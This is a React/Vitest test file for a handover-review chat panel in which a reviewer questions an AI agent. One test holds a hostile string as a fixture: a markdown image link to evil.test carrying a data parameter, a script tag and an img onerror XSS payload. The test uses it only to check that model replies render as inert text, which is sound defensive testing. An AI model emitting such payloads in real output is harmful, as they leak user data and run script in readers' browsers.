import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { cleanup, render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import HandoverReview from "./HandoverReview";
import { useReviewStore } from "./reviewStore";
import { fakeApi } from "./solutionTestApi";
import { ApiRefusal, type ChatThread, type HandoverCard } from "./solutionApi";

afterEach(cleanup);
beforeEach(() => useReviewStore.setState({ reviews: {} }));

const h: HandoverCard = {
  project: "/code/acme",
  slug: "acme",
  status: "drafted",
  instructionHash: "ih",
  approvalValid: false,
  copyStale: false,
  rejection: null,
};

const thread = (messages: ChatThread["messages"] = []): { chat: ChatThread } => ({
  chat: { chatId: "chat:01ID:acme", notice: "Chat is not part of the review record.", messages },
});

const msg = (role: "reviewer" | "agent" | "aborted", text: string) => ({
  messageId: `${role}-${text.length}`,
  ts: "2026-11-15T00:00:00Z",
  author: role === "agent" ? "agent" : "operator_session",
  role,
  text,
  instructionHash: "ih",
});

function setup(over: Record<string, unknown> = {}) {
  const api = fakeApi({
    doc: vi.fn().mockResolvedValue({ name: "handover/acme.md", content: "# Acme", hash: "ih" }),
    chat: vi.fn().mockResolvedValue(thread()),
    ...over,
  });
  render(<HandoverReview draftId="01ID" handover={h} api={api} designApprovalValid onchanged={vi.fn()} />);
  return api;
}

describe("Handover chat panel", () => {
  // TS-12 (UI): chat unavailable hides the entry point and says so (TS-47).
  it("hides the chat entry point while chat is unavailable", async () => {
    setup({ chat: vi.fn().mockRejectedValue(new ApiRefusal(503, "chat_unavailable", "chat unavailable")) });
    expect(await screen.findByText("Chat unavailable")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Chat" })).toBeNull();
  });

  // TS-10 (UI) / TS-47: open the chat, see the not-a-record label, ask.
  it("asks a question and shows the answer with the record notice", async () => {
    const user = userEvent.setup();
    const api = setup({
      ask: vi.fn().mockResolvedValue(thread([msg("reviewer", "What changes?"), msg("agent", "It builds invoices.")])),
    });
    await user.click(await screen.findByRole("button", { name: "Chat" }));
    const panel = screen.getByRole("complementary", { name: "Chat about acme" });
    expect(within(panel).getByText("Chat is not part of the review record.")).toBeInTheDocument();
    await user.type(within(panel).getByLabelText("Question"), "What changes?");
    await user.click(within(panel).getByRole("button", { name: "Send" }));
    expect(api.ask).toHaveBeenCalledWith("01ID", "acme", "What changes?");
    expect(await within(panel).findByText("It builds invoices.")).toBeInTheDocument();
    expect(within(panel).getByLabelText("Question")).toHaveValue("");
  });

  // TS-22: model output is inert text: no image, link or script is created.
  it("renders replies as plain text only", async () => {
    const user = userEvent.setup();
    const hostile = "![x](https://evil.test/c?d=1) [click](https://evil.test) <script>window.__pwned=1</script> <img src=x onerror=alert(1)>";
    setup({ chat: vi.fn().mockResolvedValue(thread([msg("agent", hostile)])) });
    await user.click(await screen.findByRole("button", { name: "Chat" }));
    const panel = screen.getByRole("complementary", { name: "Chat about acme" });
    expect(panel.textContent).toContain(hostile);
    expect(panel.querySelector("img, a, script")).toBeNull();
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("shows a stopped turn without its output, and a full chat", async () => {
    const user = userEvent.setup();
    setup({
      chat: vi.fn().mockResolvedValue(thread([msg("reviewer", "list files"), msg("aborted", "")])),
      ask: vi.fn().mockRejectedValue(new ApiRefusal(413, "chat_full", "chat full")),
    });
    await user.click(await screen.findByRole("button", { name: "Chat" }));
    const panel = screen.getByRole("complementary", { name: "Chat about acme" });
    expect(within(panel).getByText(/turn was stopped/i)).toBeInTheDocument();
    await user.type(within(panel).getByLabelText("Question"), "more");
    await user.click(within(panel).getByRole("button", { name: "Send" }));
    expect(await within(panel).findByRole("alert")).toHaveTextContent("chat full");
  });

  // TS-03 (chat layer): Esc closes the chat before full screen.
  it("closes the chat before full screen on Esc", async () => {
    const user = userEvent.setup();
    setup();
    await user.click(await screen.findByRole("button", { name: "Full screen" }));
    const fs = screen.getByRole("region", { name: "Full-screen handover acme" });
    await user.click(within(fs).getByRole("button", { name: "Chat" }));
    expect(screen.getByRole("complementary", { name: "Chat about acme" })).toBeInTheDocument();
    await user.keyboard("{Escape}");
    expect(screen.queryByRole("complementary", { name: "Chat about acme" })).toBeNull();
    expect(screen.getByRole("region", { name: "Full-screen handover acme" })).toBeInTheDocument();
    await user.keyboard("{Escape}");
    expect(screen.queryByRole("region", { name: "Full-screen handover acme" })).toBeNull();
  });
});
